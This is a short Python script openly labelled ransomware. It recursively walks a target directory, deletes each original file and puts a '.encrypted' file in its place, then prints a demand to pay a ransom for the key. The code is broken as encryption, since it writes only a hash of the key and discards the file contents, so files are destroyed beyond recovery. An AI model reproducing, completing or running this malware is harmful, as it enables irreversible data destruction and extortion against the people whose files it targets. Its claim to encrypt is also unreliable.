import os
import hashlib

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as file:
            data = file.read()
        
        encrypted_data = hashlib.sha256(key.encode()).hexdigest().encode()
        encrypted_file_path = file_path + '.encrypted'

        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)
        
        os.remove(file_path)
        print(f"File '{file_path}' encrypted successfully.")
    
    except IOError:
        print(f"Failed to encrypt file: '{file_path}'")

def encrypt_directory(directory_path, key):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def ransomware():
    target_directory = 'C:/target_directory'  # Specify the target directory here
    encryption_key = 'your_encryption_key'  # Specify your encryption key here

    encrypt_directory(target_directory, encryption_key)
    print("Encryption complete. Pay the ransom to receive the decryption key.")

ransomware()
